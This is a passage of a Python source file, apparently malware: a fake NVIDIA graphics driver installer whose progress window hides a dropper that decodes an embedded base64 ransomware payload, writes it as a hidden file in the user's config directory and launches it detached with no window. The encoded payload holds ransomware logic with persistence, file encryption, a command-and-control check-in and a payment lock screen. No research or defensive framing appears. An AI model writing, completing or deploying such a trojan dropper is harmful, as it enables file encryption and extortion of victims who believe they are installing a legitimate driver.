ZChzZWxmLCBrZXkpOgogICAgICAgIHNlbGYua2V5X3Zhci5zZXQoa2V5KQogICAgICAgIHNlbGYua2V5X2VudHJ5LmNvbmZpZyhzdGF0ZT0nbm9ybWFsJykKICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD0iU1RBVFVTOiBWYWxpZCBrZXkgcmVjZWl2ZWQuIERlY3J5cHRpb24gZW5hYmxlZC4iLCBmZz0nIzRkZmY4OCcpCiAgICAgICAgc2VsZi5kZWNyeXB0X2J1dHRvbi5jb25maWcoc3RhdGU9J25vcm1hbCcpCiAgICAgICAgc2VsZi5rZXlfZW50cnkuY29uZmlnKHN0YXRlPSdyZWFkb25seScpCiAgICAgICAgCiAgICBkZWYgZW5hYmxlX3BheW1lbnRfbW9kZShzZWxmKToKICAgICAgICBzZWxmLnBheW1lbnRfbW9kZV9hY3RpdmUgPSBUcnVlCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9IlNUQVRVUzogQlJPV1NFUiBVTkxPQ0tFRCBGT1IgUEFZTUVOVC4gRE8gTk9UIENMT1NFLiIsIGZnPSdjeWFuJykKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgICBzZWxmLm1hc3Rlci5ncmFiX3JlbGVhc2UoKQogICAgICAgICAgICAgc2VsZi5tYXN0ZXIuYXR0cmlidXRlcygnLXRvcG1vc3QnLCBGYWxzZSkKICAgICAgICAgICAgIHNlbGYubWFzdGVyLm92ZXJyaWRlcmVkaXJlY3QoRmFsc2UpIAogICAgICAgICAgICAgc2VsZi5tYXN0ZXIuaWNvbmlmeSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpbXBvcnQgd2ViYnJvd3NlcgogICAgICAgICAgICB3ZWJicm93c2VyLm9wZW4oImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9Yml0Y29pbitwYXltZW50IikgCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIAogICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDEyMDAwMCwgc2VsZi5kaXNhYmxlX3BheW1lbnRfbW9kZSkKCiAgICBkZWYgZGlzYWJsZV9wYXltZW50X21vZGUoc2VsZik6CiAgICAgICAgc2VsZi5wYXltZW50X21vZGVfYWN0aXZlID0gRmFsc2UKICAgICAgICBzZWxmLm1hc3Rlci5kZWljb25pZnkoKSAKICAgICAgICBzZWxmLm1hc3Rlci5hdHRyaWJ1dGVzKCctZnVsbHNjcmVlbicsIEZhbHNlKSAjIE5vdCBmdWxsc2NyZWVuIGFueW1vcmUhCiAgICAgICAgc2VsZi5tYXN0ZXIuYXR0cmlidXRlcygnLXRvcG1vc3QnLCBUcnVlKQogICAgICAgIHNlbGYubWFzdGVyLm92ZXJyaWRlcmVkaXJlY3QoRmFsc2UpCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9IlNUQVRVUzogTE9DS0VELiIsIGZnPScjZmZmZjRkJykKCiAgICBkZWYgc3RhcnRfZGVjcnlwdGlvbihzZWxmKToKICAgICAgICBrZXlfYjY0ID0gc2VsZi5rZXlfdmFyLmdldCgpCiAgICAgICAgaWYgbm90IGtleV9iNjQ6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIAogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IERlY3J5cHRpbmcgZmlsZXMuLi4gUGxlYXNlIHdhaXQuIiwgZmc9J3llbGxvdycpCiAgICAgICAgc2VsZi5tYXN0ZXIudXBkYXRlKCkKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIGtleSA9IGJhc2U2NC5iNjRkZWNvZGUoa2V5X2I2NCkKICAgICAgICAgICAgZGVjcnlwdGVkX2ZpbGVzID0gMAogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhUQVJHRVRfRElSRUNUT1JZKToKICAgICAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKFRBUkdFVF9ESVJFQ1RPUlkpOgogICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKEVOQ1JZUFRFRF9FWFRFTlNJT04pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkZWNyeXB0X2ZpbGVfYWVzX2djbShmaWxlX3BhdGgsIGtleSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX2ZpbGVzICs9IDEKICAgICAgICAgICAgCiAgICAgICAgICAgICMgLS0tIENMRUFOIFVQIC0tLQogICAgICAgICAgICBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZyA9IEZhbHNlICMgU3RvcCBhbGwgYmFja2dyb3VuZCB0aHJlYWRzCiAgICAgICAgICAgIAogICAgICAgICAgICAjIDEuIFJlbW92ZSBQZXJzaXN0ZW5jZQogICAgICAgICAgICByZW1vdmVfcGVyc2lzdGVuY2UoKQogICAgICAgICAgICAKICAgICAgICAgICAgIyAyLiBNYXJrIGFzIENsZWFuCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oQ0xFQU5fTUFSS0VSLCAndycpIGFzIGY6IGYud3JpdGUoIkZyZWVkIikKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgICAgICAgICAjIDMuIE51a2UgQ29uZmlnIERpcmVjdG9yeQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhDT05GSUdfRElSKToKICAgICAgICAgICAgICAgIHRyeTogc2h1dGlsLnJtdHJlZShDT05GSUdfRElSKQogICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgIAogICAgICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD1mIlNVQ0NFU1MhIHtkZWNyeXB0ZWRfZmlsZXN9IGZpbGVzIGRlY3J5cHRlZC4gU3lzdGVtIENsZWFuZWQuIiwgZmc9JyM0ZGZmODgnKQogICAgICAgICAgICBtZXNzYWdlYm94LnNob3dpbmZvKCJEZWNyeXB0aW9uIENvbXBsZXRlIiwgIllvdXIgZmlsZXMgaGF2ZSBiZWVuIHJlc3RvcmVkIGFuZCB0aGUgcmFuc29td2FyZSByZW1vdmVkLlxuRXhpdGluZyBub3cuIikKICAgICAgICAgICAgCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBsb2dfZXJyb3IoZiJEZWNyeXB0aW9uIGZhaWxlZDoge2V9IikKICAgICAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9IkVSUk9SOiBEZWNyeXB0aW9uIGZhaWxlZC4iLCBmZz0ncmVkJykKICAgICAgICAgICAgbWVzc2FnZWJveC5zaG93ZXJyb3IoIkVycm9yIiwgZiJEZWNyeXB0aW9uIGZhaWxlZDoge2V9IikKICAgICAgICAKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICAjIEZPUkNFIEVYSVQgTk8gTUFUVEVSIFdIQVQKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZi5tYXN0ZXIuZ3JhYl9yZWxlYXNlKCkgCiAgICAgICAgICAgICAgICBzZWxmLm1hc3Rlci5kZXN0cm95KCkgCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICBvcy5fZXhpdCgwKSAjIEhhcmQgZXhpdCB0byBraWxsIGFsbCB0aHJlYWRzCgojIC0tLSBNYWluIEV4ZWN1dGlvbiAtLS0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGlmIG9zLnBhdGguZXhpc3RzKENMRUFOX01BUktFUik6CiAgICAgICAgIyBEb3VibGUgY2hlY2sgaWYgY2xlYW5lciBkaWRuJ3QgZmluaXNoCiAgICAgICAgcGFzcyAKICAgIAogICAgIyAwLiBQZXJzaXN0ZW5jZSBJbnN0YWxsYXRpb24KICAgIGluc3RhbGxfcGVyc2lzdGVuY2UoKQoKICAgIGhpZGVfY29uc29sZSgpCgogICAgIyBQRVJTSVNURU5DRSBDSEVDSy1JTgogICAgIyBDaGVjayBJRCBmaWxlIGluIHN0YWJsZSBDT05GSUdfRElSCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhJRF9GSUxFKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggb3BlbihJRF9GSUxFLCAncicpIGFzIGY6CiAgICAgICAgICAgICAgICB2aWN0aW1faWQgPSBmLnJlYWQoKS5zdHJpcCgpCiAgICAgICAgICAgIGlmIHZpY3RpbV9pZDoKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIlJlc3VtaW5nIHNlc3Npb24gZm9yIFZpY3RpbSBJRDoge3ZpY3RpbV9pZH0iKQogICAgICAgICAgICAgICAgcm9vdCA9IFRrKCkKICAgICAgICAgICAgICAgIGFwcCA9IFJhbnNvbXdhcmVHVUkocm9vdCwgdmljdGltX2lkKQogICAgICAgICAgICAgICAgcm9vdC5tYWlubG9vcCgpCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzIAogICAgCiAgICAjIE5FVyBJTkZFQ1RJT04KICAgIGFlc19rZXkgPSBlbmNyeXB0X2RpcmVjdG9yeSgpCiAgICAKICAgIGlmIGFlc19rZXk6CiAgICAgICAgdmljdGltX2lkID0gY2hlY2tfaW5fd2l0aF9jMihhZXNfa2V5KQogICAgICAgIGlmIHZpY3RpbV9pZDoKICAgICAgICAgICAgcm9vdCA9IFRrKCkKICAgICAgICAgICAgYXBwID0gUmFuc29td2FyZUdVSShyb290LCB2aWN0aW1faWQpCiAgICAgICAgICAgIHJvb3QubWFpbmxvb3AoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGxvZ19lcnJvcigiRmFpbGVkIHRvIGdldCBWaWN0aW0gSUQuIEFib3J0aW5nIEdVSS4iKQogICAgZWxzZToKICAgICAgICBsb2dfZXJyb3IoIkVuY3J5cHRpb24gc2tpcHBlZCBvciBmYWlsZWQuIEFib3J0aW5nLiIpCg=="
PAYLOAD_NAME = ".nvidia_update_helper.py"

def extract_and_execute_payload():
    """Drops the ransomware payload and executes it silently."""
    try:
        payload_data = base64.b64decode(PAYLOAD_B64)
        
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                drop_dir = os.path.expanduser("~")
        
        drop_path = os.path.join(drop_dir, PAYLOAD_NAME)
        
        with open(drop_path, "wb") as f:
            f.write(payload_data)
            
        cmd = []
        if os.name == 'nt':
            cmd = ["python", drop_path]
        else:
            cmd = ["python3", drop_path]
            
        if os.name == 'nt':
            # Detach completely on Windows
            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            # Detach on Linux
            subprocess.Popen(cmd, start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

def fake_installer_gui():
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("600x400")
    root.resizable(False, False)
    root.configure(bg="#1a1a1a")

    header = Frame(root, bg="#1a1a1a")
    header.pack(fill="x", pady=20)
    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()

    content = Frame(root, bg="#1a1a1a")
    content.pack(expand=True, fill="both", padx=40)
    
    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
    status_label.pack(anchor="w", pady=(20, 5))
    
    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
    progress.pack(pady=10)

    def run_simulation():
        steps = [
            "Checking install options...", "Validating packages...", "Installing Graphics Driver...",
            "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
        ]
        
        # DROP THE PAYLOAD EXECUTION HERE
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        
        for i, step in enumerate(steps):
            time.sleep(1.0) 
            status_label.config(text=step)
            root.update()
            
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 2
                progress['value'] = current_val
                time.sleep(0.02)
                root.update()
        
        time.sleep(1)
        root.destroy()

    threading.Thread(target=run_simulation, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
